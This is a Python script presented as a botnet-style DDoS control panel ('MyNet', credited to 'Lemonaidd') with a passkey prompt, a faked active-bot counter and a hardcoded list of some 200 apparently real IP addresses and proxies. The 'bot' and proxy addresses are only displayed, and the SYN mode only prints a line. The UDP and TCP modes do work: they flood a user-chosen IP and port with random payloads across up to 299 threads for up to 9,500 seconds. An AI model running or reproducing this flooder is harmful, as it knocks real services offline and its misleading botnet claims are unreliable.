import socket
import threading
import time
import random
import os
from colorama import Fore, Style

bot_ipv4_list = [ "24.5.119.233", "99.232.138.45", "24.36.74.18", "142.114.92.35", "68.149.122.180",
"70.55.54.221", "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56",
"184.66.78.145", "96.44.189.3", "50.70.234.198", "64.231.161.118", "142.117.109.9",
"24.141.146.211", "99.233.67.107", "184.69.15.86", "74.210.76.22", "47.216.119.39",
"38.86.150.50", "71.93.145.220", "174.112.133.29", "142.161.8.124", "24.53.92.47",
"70.49.156.165", "142.166.103.244", "76.64.34.199", "135.23.120.86", "72.139.2.178",
"68.144.102.13", "184.66.236.108", "199.175.56.10", "70.30.156.92", "38.104.136.66",
"71.197.9.122", "104.57.10.105", "24.201.245.91", "47.55.69.131", "64.229.126.62",
"174.5.146.113", "50.71.33.29", "47.23.182.18", "24.89.105.37", "216.121.69.75",
"216.165.11.64", "64.183.75.215", "142.222.197.92", "47.147.124.34", "70.26.77.231",

"142.165.215.120", "65.95.75.123", "72.38.140.28", "198.84.238.130", "38.122.68.201",
"47.53.106.88", "142.117.190.206", "174.114.88.129", "24.156.159.217", "142.118.25.42",
"24.138.199.68", "65.94.137.210", "50.68.181.67", "68.151.125.41", "47.52.78.14",
"50.67.250.90", "99.234.145.33", "174.112.105.13", "24.84.170.21", "47.54.31.114",
"64.228.36.77", "184.144.27.8", "47.55.116.199", "24.85.117.162", "216.209.122.187",
"38.88.70.90", "47.148.221.50", "174.7.193.189", "104.223.94.130", "24.66.34.19",
"142.134.126.85", "74.13.71.220", "198.91.69.33", "47.135.200.191", "64.180.138.116",
"64.229.64.150", "47.52.64.216", "174.116.40.215", "216.108.234.149", "24.53.62.100",
"50.70.23.207", "50.71.208.91", "142.165.19.192", "64.229.159.101", "47.23.20.180",
"174.112.230.101", "104.246.176.42", "65.95.126.38", "184.70.226.161", "38.92.11.29",

"185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154",
"62.45.48.191", "145.129.18.72", "94.214.125.100", "31.151.64.89", "80.101.123.219",
"84.24.199.141", "94.212.160.82", "86.84.191.121", "83.86.61.49", "84.82.213.12",
"145.53.55.79", "91.204.177.151", "145.53.87.63", "86.83.191.178", "84.83.208.91",
"213.127.201.87", "94.212.46.176", "86.83.31.153", "83.83.160.66", "145.53.3.101",
"80.100.122.56", "83.82.176.10", "145.129.77.19", "145.129.52.89", "83.83.75.90",
"77.165.79.231", "83.81.5.148", "94.215.94.145", "145.128.96.45", "83.84.44.222",
"37.97.254.198", "86.83.199.66", "80.100.44.124", "145.129.201.22", "31.151.18.133",
"145.53.100.57", "145.129.67.45", "145.128.201.98", "31.151.21.87", "145.129.12.64",
"145.129.200.55", "37.97.178.91", "83.85.21.71", "145.53.190.25", "84.241.165.213",

"68.231.122.221", "98.169.90.11", "50.35.198.144", "107.190.137.22", "174.109.140.215",
"73.134.168.91", "71.195.242.187", "67.189.172.61", "24.22.15.238", "174.55.60.107",
"107.77.234.152", "24.16.142.210", "104.58.112.38", "172.116.22.205", "174.25.200.16",
"98.216.191.130", "24.14.115.60", "47.208.212.13", "174.103.200.157", "73.223.142.32",
"73.161.186.193", "98.237.132.208", "24.24.73.210", "24.12.20.109", "98.237.183.73",
"174.60.93.71", "47.222.163.221", "172.114.127.33", "67.170.45.192", "67.189.80.151",
"174.21.6.67", "24.22.243.180", "98.176.230.17", "67.164.90.184", "73.83.105.228",
"24.21.226.43", "174.109.82.219", "71.84.191.92", "73.183.71.150", "98.248.137.14",
"73.136.187.112", "24.18.202.35", "47.221.146.14", "24.19.49.84", "98.230.151.228",
"47.208.180.172", "71.231.17.40", "24.5.73.152", "24.113.13.56", "98.234.174.110"
]

proxy_list = [
    "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145"
]

MAX_THREADS = 299
MAX_DURATION = 9500

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def valid_passkey():
    return input(Fore.GREEN + "Passkey: ") == "bot0"

def show_bots_online():
    print(Fore.MAGENTA + "Checking Bots", end="", flush=True)
    for _ in range(3):
        time.sleep(0.4)
        print(".", end="", flush=True)
    time.sleep(0.3)
    print(f"\r{Fore.CYAN}Active Bots: {random.randint(1, 222)}      {Style.RESET_ALL}")

def print_menu():
    clear_screen()
    print("\033[1;35m" + r"""
    Made by: Lemonaidd

 ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
▓██▒▀█▀ ██▒ ▒██  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██    ▓██░  ▒██ ██░   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▒██    ▒██   ░ ▐██▓░   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██▒   ░██▒  ░ ██▒▓░   ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
░ ▒░   ░  ░   ██▒▒▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
       ░    ░ ░                 ░    ░  ░        
            ░ ░                                  
    """ + "\033[0m")
    show_bots_online()
    print(Fore.GREEN + "1. Attack IP\n2. Exit" + Style.RESET_ALL)

def random_bot_ip():
    return f"{random.choice(bot_ipv4_list)}:22"

def random_proxy():
    return random.choice(proxy_list)

def method_selection():
    while True:
        choice = input(Fore.CYAN + "Method (tcp/udp/syn): ").strip().lower()
        if choice in ["tcp", "udp", "syn"]:
            return choice
        print(Fore.RED + "Invalid. Use tcp, udp, or syn.")

def attack_thread(ip, port, duration, method):
    end = time.time() + duration
    payload = random._urandom(8192)  
    proxy = random_proxy()

    while time.time() < end:
        bot_ip = random_bot_ip()
        try:
            if method == "udp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(5):  
                    sock.sendto(payload, (ip, port))
                print(f"\033[1;35m[UDP] {ip}:{port} from {bot_ip} via proxy {proxy}\033[0m")
                sock.close()

            elif method == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                for _ in range(5):  
                    sock.send(payload[:8192])
                print(f"\033[1;35m[TCP] {ip}:{port} from {bot_ip} via proxy {proxy}\033[0m")
                sock.close()

            elif method == "syn":
                print(f"\033[1;35m[SYN] {ip}:{port} from {bot_ip} \033[0m")

        except Exception as e:
            print(Fore.RED + f"Error: {e}")

        

def start_attack(ip, port, duration, method, threads=299):
    thread_list = []
    for _ in range(min(threads, MAX_THREADS)):
        t = threading.Thread(target=attack_thread, args=(ip, port, min(duration, MAX_DURATION), method))
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

def menu():
    while True:
        print_menu()
        opt = input(Fore.CYAN + "Option: ").strip()
        if opt == "1":
            ip = input(Fore.CYAN + "Target IP: ")
            port = int(input(Fore.CYAN + "Port: "))
            dur = int(input(Fore.CYAN + f"Duration (max {MAX_DURATION}s): "))
            dur = min(dur, MAX_DURATION)
            method = method_selection()
            threads = int(input(Fore.CYAN + f"Threads (max {MAX_THREADS}): "))
            threads = min(threads, MAX_THREADS)
            start_attack(ip, port, dur, method, threads)
            input(Fore.CYAN + "Press Enter...")
        elif opt == "2":
            break
        else:
            print(Fore.RED + "Invalid option.")

if __name__ == "__main__":
    if valid_passkey():
        menu()
    else:
        print(Fore.RED + "Invalid passkey.")

